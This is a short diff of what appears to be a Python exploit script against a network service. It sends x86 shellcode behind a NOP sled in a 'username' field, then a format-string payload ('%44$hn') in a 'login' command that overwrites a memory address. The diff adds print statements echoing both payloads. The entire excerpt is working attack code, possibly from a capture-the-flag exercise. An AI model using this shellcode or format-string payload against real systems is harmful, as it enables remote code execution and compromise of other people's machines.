@@ -20,7 +20,9 @@ shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
                 "\x0b\xcd\x80"
 
 s.send("username " + "\x90"*16 + shellcode + "\n")  
+print("username " + "\x90"*16 + shellcode)
 s.send("login " +  "\x94\xa1\x04\x08" +"%41352d"+"%44$hn" + "\n")  
+print("login " +  "\x94\xa1\x04\x08" +"%41352d"+"%44$hn")
 s.close()  
 
 s = socket(AF_INET, SOCK_STREAM)
